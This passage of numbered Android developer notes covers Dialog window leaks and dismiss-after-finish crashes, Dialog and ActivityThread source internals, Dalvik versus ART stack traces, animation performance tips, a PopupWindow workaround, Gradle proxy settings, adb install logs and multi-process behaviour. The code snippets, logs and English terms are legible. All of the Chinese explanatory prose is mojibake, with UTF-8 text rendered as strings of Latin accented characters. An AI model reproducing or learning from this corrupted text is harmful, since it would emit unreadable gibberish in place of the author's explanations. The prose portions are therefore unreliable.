showä¸€ä¸ªDialogï¼Œå¿˜è®°å…³æ‰å°±finishï¼ŒAppä¸ä¼šå´©ï¼Œä½†æ—¥å¿—é‡Œé¢æœ‰errorï¼šä»ç”¨æˆ·è§’åº¦æ¥çœ‹ï¼ŒDialogéšç€é¡µé¢çš„å…³é—­ä¹Ÿå…³äº† E/WindowManager: android.view.WindowLeaked: Activity com.example.SomeActivity has leaked window com.android.internal.policy.PhoneWindow$DecorView at android.view.ViewRootImpl.&lt;init&gt;(ViewRootImpl.java:380) at android.view.WindowManagerGlobal.addView(WindowManagerGlobal.java:299) at android.view.WindowManagerImpl.addView(WindowManagerImpl.java:91) at android.app.Dialog.show(Dialog.java:319) ... å¯¹æ¯”ä¸€ä¸‹ä¸Šé¢é‚£ä¸ªerrorï¼Œç›®æµ‹åªæœ‰FATAL EXCEPTIONæ‰ä¼šå¯¼è‡´Appå´©æºƒ 9.3. activity finishæ‰ä¹‹åå†å»Dismissï¼Œå…ˆå‡º2çš„æ—¥å¿—ï¼Œç„¶åæ˜¯ä¸€ä¸ªfatal exception button.setOnClickListener { v -&gt; showDialog() finish() // onBackPressedä¹Ÿä¸€æ · v.postDelayed( Runnable { mDialg!!.dismiss() },2000) } //ç¬¬ä¸€ä¸ªæ˜¯è¿™ä¸ª E/WindowManager: android.view.WindowLeaked: Activity com.xxx.DialogActivity has leaked window com.android.internal.policy.PhoneWindow$DecorView{240a531 V //2ç§’ä¹‹åå‡ºç°è¿™ä¸ª E/AndroidRuntime: FATAL EXCEPTION: main Process: com.harris.simplezhihu, PID: 7256 java.lang.IllegalArgumentException: View=com.android.internal.policy.PhoneWindow$DecorView{240a531 V.E...... R......D 0,0-1026,716} not attached to window manager at android.view.WindowManagerGlobal.findViewLocked(WindowManagerGlobal.java:424) at android.view.WindowManagerGlobal.removeView(WindowManagerGlobal.java:350) at android.view.WindowManagerImpl.removeViewImmediate(WindowManagerImpl.java:123) at android.app.Dialog.dismissDialog(Dialog.java:362) å°±å´©äº†ï¼Œdismissä¹‹å‰å…ˆåˆ¤æ–­ä¸‹isFinishingå°±æ²¡äº‹äº† 9.4. dialog.showä¸æ˜¯å¼‚æ­¥æ–¹æ³• showDialog() finish() Appä¸ä¼šå´©ï¼Œå’Œ2ä¸€æ ·çš„erroræ—¥å¿—,çœ‹æ¥ä¸æ˜¯Fatalç…ä¸€çœ¼æºç Dialog.java: public void show() { // ....... mWindowManager.addView(mDecor, l); mShowing = true; sendShowMessage();//å‘ä¸ªæ¶ˆæ¯ç»™ï¼ŒOnShowListener } private void sendShowMessage() { if (mShowMessage != null) { // Obtain a new message so this dialog can be re-used Message.obtain(mShowMessage).sendToTarget(); //sendToTargetæ˜¯åˆ°ä¸»çº¿ç¨‹çš„MessageQueueå»æ’é˜Ÿäº† } } æ‰€ä»¥uiä¸Šæ˜¾ç¤ºå‡ºDialogå’ŒonShowä¸æ˜¯ä¸€å‰ä¸€å(åœ¨åŒä¸€ä¸ªæ¶ˆæ¯é‡Œé¢)è°ƒç”¨çš„ã€‚ private static final class ListenersHandler extends Handler { private final WeakReference&lt;DialogInterface&gt; mDialog; public ListenersHandler(Dialog dialog) { mDialog = new WeakReference&lt;&gt;(dialog); } @Override public void handleMessage(Message msg) { switch (msg.what) { case DISMISS: ((OnDismissListener) msg.obj).onDismiss(mDialog.get()); break; case CANCEL: ((OnCancelListener) msg.obj).onCancel(mDialog.get()); break; case SHOW: ((OnShowListener) msg.obj).onShow(mDialog.get()); break; } } } å¾ˆå®¹æ˜“æƒ³åˆ°onDismiss(Dialog)é‡Œé¢çš„dialogå¯èƒ½ä¸ºnullï¼Œ(ä¸»çº¿ç¨‹æ°å¥½åœ¨æ’é˜Ÿï¼Œæ­£å¥½æ¥ä¸€æ¬¡GC)ï¼Œå¯èƒ½æ€§åº”è¯¥ä¸å¤§ã€‚ 9.5. Dialogä¸­æœ‰ä¸€ä¸ªOnKeyListenerï¼Œæ‰€ä»¥ç”¨æˆ·æ‰‹åŠ¨æŒ‰è¿”å›é”®ä¼šå»dismissDialogå¹¶æ¶ˆè´¹æ‰äº‹ä»¶ï¼Œä»£ç è°ƒç”¨onBackPressedå’Œæ‰‹åŠ¨æŒ‰è¿”å›é”®æ˜¯ä¸ä¸€æ ·çš„ã€‚ 10. RecyclerViewçš„ItemAnimatoræœ‰å¾ˆå¤šæ–¹æ³•å¯ä»¥overrideChetçš„Demo 11. ä¸€äº›ç‚¹ å›¾ç‰‡ç¼“å­˜ç­–ç•¥ Rxjavaå¦‚ä½•ç®¡ç†ç”Ÿå‘½å‘¨æœŸ Okioæºç  OkHttpä¸­å’ŒWebViewä¸­Cookieæ˜¯æ€ä¹ˆå¤„ç†çš„ Androidä¸ŠSocketçš„ä½¿ç”¨ æ³¨è§£ Androidä¸Šçš„è¿›ç¨‹é€šä¿¡ï¼Œå…±äº«å†…å­˜é—®é¢˜ Webpæ ¼å¼ UI widgetæ£€æŸ¥Threadæ˜¯åœ¨ViewRootImplé‡Œé¢æœ‰ä¸€æ®µæ–¹æ³•checkThread() ã€‚ 12. No Activity found to handle Intent { act=com.android.camera.action.CROPcom.android.camera.action.CROPå¹¶ä¸æ˜¯ä¸€ä¸ªAOSPå®˜æ–¹è§„å®šçš„Intentï¼Œæœ‰äº›è®¾å¤‡ä¸Šæ˜¯ä¼šæŠ¥é”™çš„ã€‚è¿™ä¸ªé“¾æ¥çš„ä½œè€…æ˜¯Mark Murphyï¼Œå¾ˆæœ‰è¶£çš„ä¸€ä¸ªäººã€‚stackOverFlowä¸Šä¹Ÿæœ‰è®¨è®ºè§£å†³åŠæ³•å°±æ˜¯åŠ ä¸€ä¸ªcatch(ActivityNotFoundException)å°±å¥½äº† 13. Dalvikå’ŒArtå´©çš„æ—¶å€™å †æ ˆæ˜¯ä¸ä¸€æ ·çš„//Dalvikæ˜¯è¿™ä¹ˆå´©çš„ at android.view.View.performClick(View.java:4438) at android.view.View$PerformClick.run(View.java:18439) at android.os.Handler.handleCallback(Handler.java:733) at android.os.Handler.dispatchMessage(Handler.java:95) at android.os.Looper.loop(Looper.java:136) at android.app.ActivityThread.main(ActivityThread.java:5095) at java.lang.reflect.Method.invokeNative(Method.java) at java.lang.reflect.Method.invoke(Method.java:515) at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:786) at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:602) at dalvik.system.NativeStart.main(NativeStart.java) //artæ˜¯è¿™ä¹ˆå´©çš„ at android.app.Activity.performStart(Activity.java:6311) at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2387) at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:2484) at android.app.ActivityThread.access$900(ActivityThread.java:158) at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1352) at android.os.Handler.dispatchMessage(Handler.java:102) at android.os.Looper.loop(Looper.java:171) at android.app.ActivityThread.main(ActivityThread.java:5454) at java.lang.reflect.Method.invoke(Method.java) at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:726) at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:616) 14. ç†è§£Canvas,surface,windowç­‰æ¦‚å¿µDianne Hackbornçš„å›ç­”onDrawé‡Œé¢çš„canvasæ˜¯lock surfaceå¾—åˆ°çš„ 15.å¦‚æœæƒ³è¦ç”¨ä¸€ä¸ªåŠ¨ç”»ç§»åŠ¨ä¸€ä¸ªViewçš„è¯ï¼Œæ²¡å¿…è¦animateæ›´æ”¹LayoutParamsæ›´æ”¹LayoutParamsçœ‹ä¸Šå»æ˜¯ç°å®ç”Ÿæ´»ä¸­åº”è¯¥åšçš„ï¼Œä½†å…¶å®åªéœ€è¦ç”¨setTranslationXæˆ–è€…setTranslationYå°±å¥½äº†ã€‚å¦‚æœåŠ¨ç”»çš„æ¯ä¸€å¸§éƒ½å»æ›´æ”¹layoutParamsï¼ˆä¼šrequestLayoutï¼Œéå¸¸æ…¢ï¼‰,æ­£ç¡®çš„åšæ³•æ˜¯åœ¨è§†è§‰ä¸Šåšåˆ°æ­£ç¡®çš„ï¼Œanimate TranslationXï¼Œè¿™äº›æ˜¯postLayout paramsï¼Œç­‰åŠ¨ç”»ç»“æŸåå†æŠŠåº”æœ‰çš„layoutå±æ€§è®¾ç½®ä¸Šå»ã€‚è¿™æ ·åŠ¨ç”»ä¼šæ›´åŠ æµç•…ã€‚ â€”- Android for Java Developers(Big Android BBQ 2015) â€“ Chet Haase 16. tintè·‘åœ¨GPUä¸Šï¼Œbackgroundä¼šinvalidateæ•´ä¸ªDrawableå¦‚æœæƒ³è¦åŠ¨ç”»æ¸å˜ä¸€ä¸ªViewçš„Backgroundçš„è¯,animate tintå³å¯ï¼Œæ€§èƒ½æ›´å¥½ 17. SpringAnimation(å…·æœ‰å¼¹æ€§çš„åŠ¨ç”»)Facebookæ—©åœ¨15å¹´å°±æ¨å‡ºäº†å…·æœ‰å¼¹æ€§çš„åŠ¨ç”»,è°·æ­Œåœ¨16å¹´ç»™supportLibæ·»åŠ äº†Spring Animationï¼Œéƒ½æ˜¯ç›¸ä¼¼çš„ç†å¿µã€‚å¼¹æ€§åŠ¨ç”»çš„å…³é”®æ˜¯åœ¨keyFrameå¤„ç®—å‡ºéçº¿æ€§çš„å€¼ï¼Œç”¨äºè®¾å®šUIæ§ä»¶å±•ç¤ºçŠ¶æ€ã€‚ 18. Choreographerå¯ä»¥æ·»åŠ callbackdoFrameæ–¹æ³•çš„å‚æ•°æ˜¯(long FrameTimeNanos)ï¼Œè¿™ä¸ªæ—¶é—´éœ€è¦é™¤ä»¥1000 1000æµ‹è¯•äº†ä¸€ä¸‹ï¼ŒFrameç¡®å®æ˜¯16æ¯«ç§’æ›´æ–°ä¸€æ¬¡ï¼Œä¹Ÿå°±æ˜¯æ¥æ”¶åˆ°VSYNCä¿¡å·çš„æ—¶æœºã€‚å…¶å®ç®€å•çš„æƒ³ä¸€ä¸‹ï¼Œè¿™æ ·å¯ä»¥ç”¨æ¥æ˜¾ç¤ºå½“å‰åº”ç”¨çš„å¸§ç‡ï¼Œ16mså°±æ˜¯60FPS,20mså°±æ˜¯50FPS.è®ºé‚£äº›è·‘åˆ†è½¯ä»¶æ˜¯æ€ä¹ˆåšå‡ºæ¥çš„ã€‚ã€‚ã€‚ã€‚å½“ç„¶æ›´ä¸“ä¸šçš„æ–¹å¼åº”è¯¥æ˜¯è¿™ä¸ªå‘½ä»¤ adb shell dumpsys SurfaceFlinger â€“latency + &lt;windowå&gt;ç½‘ä¸Šæœ‰äººå†™äº†pythonè„šæœ¬ï¼Œçœ‹èµ·æ¥æ›´åŠ ç›´è§‚ä¸€ç‚¹ 19. ç½‘ç»œè¯·æ±‚çš„Batchç½‘ç»œè¾ƒå·®çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥å°†Request cacheä¸‹æ¥ï¼Œç­‰åˆ°ç½‘ç»œè¾ƒå¥½çš„æ—¶å€™å†æ‰§è¡Œã€‚Jesse Wilsonæ¨èä½¿ç”¨TAPEæœ‰ä¸¤ç§å®ç°ï¼ŒåŸºäºæ–‡ä»¶ç³»ç»Ÿçš„å’ŒåŸºäºå†…å­˜çš„ã€‚åŸºäºå†…å­˜çš„å¾ˆç®€å•ï¼ŒåŸºäºæ–‡ä»¶çš„èƒ½å¤Ÿåœ¨crashå‘ç”Ÿæ—¶è‡ªåŠ¨å›é€€ã€‚ 20.getSystemServiceæ˜¯å­˜åœ¨memory leaké—®é¢˜çš„context.getSystemServiceæºç åˆ†æåˆ°æœ€åï¼Œæ˜¯ä»ä¸€ä¸ªHashmapé‡Œé¢å–å‡ºServiceactivity.getSystemService -&gt; ContextImpl.getSystemService -&gt; SystemServiceRegistry.getSystemService(SystemServiceRegistryé‡Œé¢æœ‰ä¸ªHashMap&lt;String, ServiceFetcher&lt;?&gt;&gt;)WifiManagerå­˜åœ¨leakçš„issue 21. PopupWindowåœ¨7.0å’Œ7.1ä¸Šæ˜¯å­˜åœ¨é—®é¢˜çš„å‚è€ƒè§£å†³æ–¹å¼ if (Build.VERSION.SDK_INT &lt; 24) { popupWindow.showAsDropDown(button); } else { int[] location = new int[2]; // è·å–æ§ä»¶åœ¨å±å¹•çš„ä½ç½® button.getLocationOnScreen(location); if (Build.VERSION.SDK_INT == 25) { int tempheight = popupWindow.getHeight(); if (tempheight == WindowManager.LayoutParams.MATCH_PARENT || screenHeight &lt;= tempheight) { popupWindow.setHeight(screenHeight - location[1] - button.getHeight()); } } popupWindow.showAtLocation(button, Gravity.NO_GRAVITY, location[0], location[1] + button.getHeight()); } 22. onSaveInstanceçš„è°ƒç”¨é¡ºåºä»¥åŠActivityThreadçš„ä¸€äº›ç‚¹onSaveInstanceåœ¨HoneyCombä¹‹å‰ä¼šåœ¨onPauseå‰è°ƒç”¨ï¼ŒHoneyCombå¼€å§‹ï¼Œä¼šåœ¨onStopå‰è°ƒç”¨3.0ä¹‹å‰çš„åŸºæœ¬ä¸ç”¨çœ‹äº†ï¼Œç›®å‰åœ¨Android 25 sdkä¸­ActivityThread.performStopActivityInner if (!r.activity.mFinished &amp;&amp; saveState) { if (r.state == null) { callCallActivityOnSaveInstanceState(r); } } try { // Now we are idle. r.activity.performStop(false /*preserveWindow*/); } catch (Exception e) { if (!mInstrumentation.onException(r.activity, e)) { throw new RuntimeException( &quot;Unable to stop activity &quot; + r.intent.getComponent().toShortString() + &quot;: &quot; + e.toString(), e); } } å…¶å®Activityçš„æ‰€æœ‰onXXXéƒ½æ˜¯ç”±ActivityThreadå‘èµ·çš„ï¼Œå…¶å®ä¸»å‡½æ•°ä¹Ÿåœ¨è¿™é‡Œã€‚é‚£ä¹ˆå¼€å§‹å§ActivityThread.handleLaunchActivity private void handleLaunchActivity(ActivityClientRecord r, Intent customIntent, String reason){ // ................... Activity a = performLaunchActivity(r, customIntent); //&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39; if (a != null) { handleResumeActivity(r.token, false, r.isForward, !r.activity.mFinished &amp;&amp; !r.startsNotResumed, r.lastProcessedSeq, reason); } //&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39; } private Activity performLaunchActivity(ActivityClientRecord r, Intent customIntent){ // ............ activity = mInstrumentation.newActivity( cl, component.getClassName(), r.intent); //Activityå®ä¾‹å°±æ˜¯åœ¨è¿™é‡Œé¢åå°„åˆ›å»ºå‡ºæ¥çš„ if (activity != null) { //...... mInstrumentation.callActivityOnCreate(activity, r.state); /// onCreate if (!r.activity.mFinished) { //ç»å¸¸ä¼šæœ‰äººåœ¨onCreateé‡Œé¢finish activity.performStart(); // onStart r.stopped = false; } } } æ‰€ä»¥æ€»çš„é¡ºåºæ˜¯ActivityThread#handleLaunchActivity -&gt;ActivityThread#performLaunchActivity -&gt;åå°„åˆ›å»ºActivityå®ä¾‹ -&gt;mInstrumentation.callActivityOnCreate -&gt;activity.performStart() -&gt;handleResumeActivity()ä»¥ä¸Šéƒ½æ˜¯åœ¨ä¸€ä¸ªMessageé‡Œé¢åšçš„è¿™ä¸ªMessageçš„whatæ˜¯â€œLAUNCH_ACTIVITY =100â€ï¼Œè¿™ä¸ªMessageæ˜¯åŸºæœ¬çš„å°¿æ€§æ˜¯ handleXXX -&gt; performXXXå¦å¤–,onActivityResultæ˜¯åœ¨ActivityThreadçš„deliverResultsé‡Œé¢è§¦å‘çš„ 23. ç¼–è¯‘å‡ºé”™ duplicate files copied in apk lib/x86/libRoadLineRebuildAPI.so é›†æˆé«˜å¾·åœ°å›¾çš„æ—¶å€™ åœ¨appçš„build.gradleä¸­æ·»åŠ  packagingOptions { pickFirst &#39;lib/**.so&#39; } 24. Could not resolve com.android.support:appcompat-v7:26.1.0Android Studioé‡Œé¢è®¾ç½®httpProxyè¦ç”Ÿæ•ˆå…¶å®å¾—çœ‹gradle.properitiesæ–‡ä»¶é‡Œé¢è¿™å‡ è¡Œ systemProp.http.proxyPort=1080 systemProp.http.proxyHost=127.0.0.1 systemProp.https.proxyPort=1080 systemProp.https.proxyHost=127.0.0.1 æ³¨æ„ï¼Œmaven(),google()è¿™äº›åº“éƒ½æ˜¯httpsçš„ï¼Œæ‰€ä»¥å¾—æŠŠhttpsä¹Ÿå‹¾ä¸Šã€‚ 25. æ‰§è¡Œgradlewå‘½ä»¤å¤šäº†ä¹‹åcç›˜å ç”¨ç©ºé—´è¶Šæ¥è¶Šå°æ‰§è¡Œgradlewå‘½ä»¤ï¼Œä¼šæ ¹æ®gradlew-wrapper.properitiesä¸­è®¾ç½®çš„distributionUrlå»ä¸‹è½½å¯¹åº”çš„gradle-4.1-all.zipï¼Œç„¶åunzipåˆ° C://Users//username//.gradle//wrapper//dists è¿™ä¸ªç›®å½•ã€‚æ‰€ä»¥åˆ‡æ¢åˆ°è¿™ä¸ªç›®å½•ï¼Œå¯ä»¥æŠŠä¹‹å‰2.x,3.xçš„å…¨éƒ¨éƒ½åˆ æ‰äº†ï¼Œçœ‹äº†ä¸‹å¤§å°ï¼Œå°†è¿‘3ä¸ªGBã€‚è¿˜æœ‰æ¯ä¸ªAndroidé¡¹ç›®çš„æ ¹ç›®å½•ä¸‹éƒ½æœ‰ä¸€ä¸ª.gradleæ–‡ä»¶å¤¹ã€‚æŒ‰ç…§linuxæ–‡ä»¶ç³»ç»Ÿçš„ä¼ ç»Ÿï¼Œå‰é¢åŠ ä¸Šä¸€ä¸ªç‚¹çš„æ„æ€éƒ½æ˜¯éšè—æ–‡ä»¶ã€‚ç‚¹è¿›å»çœ‹ï¼Œé‡Œé¢çš„ä¸œè¥¿åˆ é™¤ä¹Ÿæ²¡é—®é¢˜ã€‚ 26. åœ¨ AndroidStudio å·¥ç¨‹ç‚¹å‡» Run æŒ‰é’®ï¼Œ å®é™…ä¸Šåšäº†ä»€ä¹ˆæ“ä½œå‘¢ï¼ŸçŸ¥ä¹çš„å›ç­”çœ‹ä¸‹æ—¥å¿—å°±å¾ˆæ¸…æ™°äº† 17:35:33 Executing tasks: [:app:assembleDebug] 17:35:34 Gradle build finished in 858ms 03/06 15:50:39: Launching app $ adb push F:\\workspace\\clones\\AndroidRepo\\app\\build\\outputs\\apk\\debug\\app-debug.apk /data/local/tmp/com.me.harris.myapplication $ adb shell pm install -t -r &quot;/data/local/tmp/com.me.harris.myapplication&quot; Success $ adb shell am start -n &quot;com.me.harris.myapplication/com.me.harris.myapplication.MainActivity&quot; -a android.intent.action.MAIN -c android.intent.category.LAUNCHER Client not ready yet..Waiting for process to come online Waiting for process to come online Connected to process 16409 on device vivo-vivo_x9-a9c690fb Success $ adb shell am start -n &quot;com.didi.virtualapk/com.didi.virtualapk.MainActivity&quot; -a android.intent.action.MAIN -c android.intent.category.LAUNCHER Client not ready yet..Waiting for process to come online Connected to process 21777 on device samsung-sm_g9500-98895a473737504e42 ç®€å•æ¥è¯´å°±æ˜¯gradle installDebug Android Stuidoç‚¹å‡»buildæŒ‰é’®åšäº†ä»€ä¹ˆConfigure Your Build 27. å¤šè¿›ç¨‹åœºæ™¯ä¸‹Applicationçš„onCreateæ˜¯ä¼šè¢«å¤šæ¬¡è°ƒç”¨çš„åœ¨Applicationçš„onCreateä¸­æ·»åŠ æ—¥å¿— //æ­£å¸¸çš„Applicationèµ·æ¥éƒ½æ˜¯1 Log.e(&quot;current-process-id is &quot;+android.os.Process.myPid()); // 1 Log.e(&quot;current-thread-id is &quot;+Thread.currentThread().getId()); // 1 //åœ¨åº”ç”¨å†…ç‚¹å‡»æŒ‰é’®èµ·ä¸€ä¸ªprocessï¼Œapplicationçš„onCreateåˆè¢«æ‰§è¡Œäº†ä¸€æ¬¡ Log.e(&quot;current-process-id is &quot;+android.os.Process.myPid()); // 12055 Log.e(&quot;current-thread-id is &quot;+Thread.currentThread().getId()); // 1 //è¿™æ—¶å€™çœ‹ä¸‹å½“å‰ç³»ç»Ÿä¸­è·‘çš„æ‰€æœ‰è¿›ç¨‹ï¼Œè¿™ä¸ª12055çš„è¿›ç¨‹å°±åœ¨è¿™é‡Œé¢ ActivityManager mActivityManager = (ActivityManager)this.getSystemService(getApplicationContext().ACTIVITY_SERVICE); for (ActivityManager.RunningAppProcessInfo appProcess : mActivityManager.getRunningAppProcesses()) { if (appProcess.pid == pid) { processNameString = appProcess.processName; } } è‡³äºåŸå› çš„è¯ï¼ŒActivityThreadçš„handleCreateServiceæ–¹æ³•ä¸­æœ‰è¿™ä¹ˆä¸€å¥ï¼š Application app = packageInfo.makeApplication(false, mInstrumentation);ä½†æ˜¯è¿™ä¸ªä¸ä¼šæŠŠMainActivityé‡æ–°åˆ›å»ºä¸€ä¸ªã€‚ è‡³äºä¸ºä»€ä¹ˆè¦ç”¨å¤šè¿›ç¨‹ï¼Œå¾®ä¿¡Androidå®¢æˆ·ç«¯åå°ä¿æ´»ç»éªŒåˆ†äº«è¿™ç¯‡æ–‡ç« ä¸­æåˆ°äº†å¾®ä¿¡è‡³å°‘ç”¨äº†ä¸‰ä¸ªè¿›ç¨‹ï¼Œè¿™ç¯‡æ–‡ç« è¿˜æåˆ°Shadowsocks-Androidå°±å¼€äº†ä¸ªè¿›ç¨‹è·‘Cç¨‹åºæ¥ç»´æŠ¤ä»£ç†ã€‚è®°å¾—ç³»ç»Ÿç»™æ¯ä¸ªApplicationåˆ†é…çš„å†…å­˜æ€»é‡ä¸é‚£ä¹ˆå¤šï¼Œå¯ä»¥é€šè¿‡ Runtime runtime = Runtime.getRuntime(); LogUtil.w(TAG, String.valueOf(toMB(runtime.freeMemory()))); // 5.79MB LogUtil.w(TAG, String.valueOf(toMB(runtime.totalMemory()))); //14.13MB private String toMB(long number) { return String.format(&quot;%.2f&quot;, number / 1024.0 / 1024.0); } å¤§æ¦‚ä¹Ÿå°±å‡ åä¸ªMBçš„æ ·å­ï¼Œç¡®å®ä¸æ˜¯å¾ˆå¤šã€‚å¤šè¿›ç¨‹ä¸‹ï¼Œç­‰äºå¹³ç™½å¤šäº†å‡ åMBçš„å†…å­˜ï¼Œå¯¹äºç¼“è§£æ€§èƒ½å‹åŠ›è¿˜æ˜¯æœ‰å¥½å¤„çš„ã€‚ å¤§æ¦‚ä»€ä¹ˆæ—¶å€™å°±åº”è¯¥å¼€ä¸€ä¸ªå¤šè¿›ç¨‹å‘¢å­è¿›ç¨‹æŒ‚äº†ï¼Œä¸»è¿›ç¨‹ç…§æ ·èƒ½è·‘ï¼Œäº²æµ‹ä¼šå‡ºç°è¿™æ ·çš„log JavaBinder: *** Uncaught remote exception! (Exceptions are not yet supported across processes.) 28. å…³äºAndroid APK å®‰è£…è¿‡ç¨‹ä»¥ä¸‹å†…å®¹æ¥è‡ªAndroid APK å®‰è£…è¿‡ç¨‹è¯¦è§£é¦–å…ˆAPK çš„æœ¬è´¨æ˜¯ä¸€ä¸ª Zip å‹ç¼©åŒ…ï¼Œåªæ˜¯åç¼€è¢«ä¿®æ”¹ä¸º apkï¼Œå…¶ä¸­æ‰“åŒ…äº†æºä»£ç ç¼–è¯‘å‡ºçš„ class.dexã€ä¸€äº›å›¾ç‰‡è§†é¢‘èµ„æºæ–‡ä»¶å’Œä¸€äº› Native åº“æ–‡ä»¶ã€‚APK æ–‡ä»¶ä¸ Zip æ–‡ä»¶æœ€å¤§çš„ä¸€ä¸ªä¸åŒæ˜¯ APK åŒ…å«ç­¾åä¿¡æ¯ï¼Œç”¨äºä¿è¯å®‰è£…åŒ…å®‰å…¨ä¸è¢«ä¿®æ”¹ã€‚ ODEX æ–‡ä»¶æ˜¯ Dalvik å°† DEX æ–‡ä»¶ä¸­å¯æ‰§è¡Œæ–‡ä»¶â€”â€”class.dexâ€”â€”æ–‡ä»¶è§£å‹å‡ºæ¥åï¼Œå­˜å‚¨åœ¨æœ¬åœ°åç”Ÿæˆçš„ã€‚å› ä¸º Android ç³»ç»Ÿæ— æ³•ç›´æ¥è¿è¡Œ APK æ–‡ä»¶ï¼Œéœ€è¦å°†å…¶è§£å‹åæ‰¾åˆ° class.dex æ–‡ä»¶åæ‰å¯ä»¥è¿è¡Œï¼Œå› æ­¤åœ¨å®‰è£…æ—¶å°±å°†å…¶å–å‡ºæ”¾åœ¨æœ¬åœ°ï¼Œå¯ä»¥æé«˜åº”ç”¨å¯åŠ¨é€Ÿåº¦ã€‚é™¤äº†è¿™ä¸ªåŸå› ï¼Œå…¶å®åœ¨å°† class.dex è½¬æ¢æˆ ODEX æ–‡ä»¶è¿‡ç¨‹ä¸­ï¼Œè¿˜æ ¹æ®å½“å‰ç³»ç»Ÿè¿›è¡Œäº†ä¼˜åŒ–ï¼ˆç›´æ¥å¤åˆ¶åˆ°å…¶ä»–ç³»ç»Ÿä¸ä¸€å®šå¯ä»¥è¿è¡Œï¼‰ï¼Œæ–‡ä»¶å¤§å°ä¼šå‡å°‘ï¼ŒODEX æ–‡ä»¶æ¯” DEX æ–‡ä»¶æ›´éš¾åç¼–è¯‘ï¼Œè¿™ä¹Ÿåœ¨ä¸€å®šç¨‹åº¦ä¸Šæé«˜äº†å®‰å…¨æ€§ï¼Œå› æ­¤åœ¨ä¸€äº›ç³»ç»Ÿé¢„è£…æˆ–ç³»ç»Ÿçº§åº”ç”¨å¤§å¤šé‡‡ç”¨äº† ODEX ä¼˜åŒ–ã€‚ä¸€èˆ¬ ODEX ä¸ç›´æ¥è¿è¡Œï¼Œåœ¨ Dalvik è¿è¡Œ ODEX æ—¶ï¼Œéœ€è¦é€šè¿‡ JIT è¿›è¡Œä¼˜åŒ–ï¼Œæé«˜è¿è¡Œæ•ˆç‡ã€‚JIT æ˜¯ä¸€ç§åœ¨è¿è¡Œæ—¶åŒæ­¥å°†å­—èŠ‚ç è½¬åŒ–æˆæœºå™¨ç çš„è¿‡ç¨‹ï¼ŒDalvik ç›´æ¥è¿è¡Œè½¬åŒ–åçš„æœºå™¨ç ï¼Œè¿™ä¼šå¯¼è‡´éƒ¨åˆ†çš„å†…å­˜å’Œæ—¶é—´å¼€é”€ï¼Œä½†æ˜¯æ•´ä½“æ¥è¯´ï¼Œåœ¨æŸäº›æƒ…å†µä¸‹æ˜¯ä¼šæé«˜ç³»ç»Ÿæ€§èƒ½çš„ã€‚ï¼ˆæœ‰äº›åŠ¨æ€ç¼–è¯‘å™¨ï¼Œå¯èƒ½æ ¹æ®ç»éªŒæˆ–å°è¯•ç¼–è¯‘ï¼Œä¼˜åŒ–è¿™ä¸€è¿‡ç¨‹ï¼Œå¯èƒ½è¿è¡Œæ¬¡æ•°è¶Šå¤šï¼Œä¼˜åŒ–æ•ˆæœè¶Šå¥½ï¼‰OAT æ–‡ä»¶æ˜¯ ART è¿è¡Œçš„æ–‡ä»¶ï¼Œæ˜¯ä¸€ç§äºŒè¿›åˆ¶å¯è¿è¡Œæ–‡ä»¶ï¼ŒåŒ…å« DEX æ–‡ä»¶å’Œç¼–è¯‘å‡ºçš„æœ¬åœ°æœºå™¨æŒ‡ä»¤æ–‡ä»¶ï¼Œå…¶æ–‡ä»¶æ ¼å¼ç±»ä¼¼äºç½‘ç»œæ•°æ®æŠ¥æ–‡ï¼ŒåŒ…å«æ–‡ä»¶å¤´å’Œæ–‡ä»¶ä½“ï¼Œæ–‡ä»¶å¤´çš„ oatdataã€oatexec å’Œ oatlastword å­—æ®µåˆ†åˆ«æè¿° DEX æ–‡ä»¶ä½ç½®å’Œæœ¬åœ°æœºå™¨æŒ‡ä»¤çš„èµ·æ­¢ä½ç½®ã€‚å› ä¸º OAT æ–‡ä»¶åŒ…å« DEX æ–‡ä»¶ï¼Œå› æ­¤æ¯” ODEX æ–‡ä»¶å ç”¨ç©ºé—´æ›´å¤§ï¼Œç”±äºå…¶åœ¨å®‰è£…æ—¶ç»è¿‡äº† ART çš„å¤„ç†ï¼ŒART åŠ è½½ OAT æ–‡ä»¶åä¸éœ€è¦ç»è¿‡å¤„ç†å°±å¯ä»¥ç›´æ¥è¿è¡Œï¼Œå®ƒæ²¡æœ‰äº†ä»å­—èŠ‚ç è£…æ¢æˆæœºå™¨ç çš„è¿‡ç¨‹ï¼Œå› æ­¤è¿è¡Œé€Ÿåº¦æ›´å¿«ã€‚å¯ä»¥ç†è§£ä¸º JIT ä»è¿è¡Œæ—¶æ‰è§£ææå‰åˆ°äº†å®‰è£…æ—¶è§£æï¼Œå®‰è£…å˜æ…¢ï¼Œè¿è¡Œå˜å¿«ã€‚ å†ä»”ç»†ä¸€ç‚¹æŒ–æ˜çš„è¯ï¼Œæ‰¾åˆ°è¿™æ ·ä¸€ç¯‡æ–‡ç«  private boolean connect() { if (mSocket != null) { return true; } Slog.i(TAG, &quot;connecting...&quot;); try { mSocket = new LocalSocket(); LocalSocketAddress address = new LocalSocketAddress(&quot;installd&quot;, LocalSocketAddress.Namespace.RESERVED); mSocket.connect(address); mIn = mSocket.getInputStream(); mOut = mSocket.getOutputStream(); } catch (IOException ex) { disconnect(); return false; } return true; } æ˜¾ç„¶æ˜¯é€šè¿‡socketé€šä¿¡çš„ï¼Œåº”ç”¨ç¨‹åºçš„å®‰è£…ä¸å¸è½½å¹¶éPackageManagerServiceæ¥å®Œæˆï¼Œè€Œæ˜¯é€šè¿‡PackageManagerServiceæ¥è®¿é—®installdæœåŠ¡æ¥æ‰§è¡Œç¨‹åºåŒ…çš„å®‰è£…ä¸å¸è½½çš„ã€‚ installdæ˜¯é€šè¿‡init.rcåœ¨ç³»ç»Ÿå¯åŠ¨æ—¶å°±å¼€å§‹è¿è¡Œçš„æœåŠ¡ï¼Œinstalldè¿›ç¨‹æ˜¯ç”¨cå†™çš„ï¼Œè¿™é‡Œé¢ä¹Ÿæ˜¯å†™äº†ä¸€ä¸ªå¾ªç¯åœ¨è·‘çš„server: for (;;) { s = accept(lsocket, &amp;addr, &amp;alen); } 